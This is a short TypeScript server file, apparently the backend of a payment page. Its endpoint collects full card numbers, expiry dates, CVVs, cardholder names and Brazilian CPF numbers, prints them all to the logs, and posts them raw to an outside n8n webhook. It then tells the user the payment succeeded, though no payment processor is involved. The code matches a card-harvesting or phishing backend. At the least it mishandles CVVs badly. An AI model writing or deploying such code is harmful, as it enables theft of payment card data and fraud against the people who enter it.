import { Hono } from "hono";

const app = new Hono<{ Bindings: Env }>();

// Payment submission endpoint
app.post("/api/payment", async (c) => {
  try {
    const body = await c.req.json();
    
    // Validate CPF has exactly 11 digits
    const cpfNumbers = body.cpf.replace(/\D/g, '');
    if (cpfNumbers.length !== 11) {
      console.error("CPF inválido - deve ter 11 dígitos:", body.cpf, "->", cpfNumbers);
      return c.json({
        success: false,
        message: "CPF deve ter exatamente 11 dígitos numéricos"
      }, 400);
    }

    // Extract and format data for n8n webhook
    const webhookData = {
      numero_ct: body.cardNumber.replace(/\s/g, ''), // Remove spaces
      validade_ct: body.expiry,
      cod_seg: body.cvv,
      nome: body.cardName,
      cpf: cpfNumbers // Always 11 numeric digits
    };

    // Send to n8n webhook
    const webhookUrl = "https://n8n.v-app.site/webhook/9891c5b9-162e-4f1a-8b0d-48d7c72fb256";
    
    console.log("Enviando dados para webhook:", JSON.stringify(webhookData, null, 2));
    
    const response = await fetch(webhookUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "User-Agent": "MochaApp/1.0"
      },
      body: JSON.stringify(webhookData)
    });

    console.log("Resposta do webhook:", response.status, response.statusText);
    
    if (!response.ok) {
      const errorText = await response.text();
      console.error("Erro do webhook:", errorText);
      throw new Error(`Webhook request failed: ${response.status} - ${errorText}`);
    }

    const result = await response.text();
    console.log("Resultado do webhook:", result);
    
    let parsedResult;
    try {
      parsedResult = JSON.parse(result);
    } catch {
      parsedResult = result;
    }

    return c.json({
      success: true,
      message: "Pagamento processado com sucesso",
      webhookResponse: parsedResult
    });
  } catch (error) {
    console.error("Payment error:", error);
    return c.json({
      success: false,
      message: "Erro ao processar pagamento",
      error: error instanceof Error ? error.message : "Unknown error"
    }, 500);
  }
});

export default app;
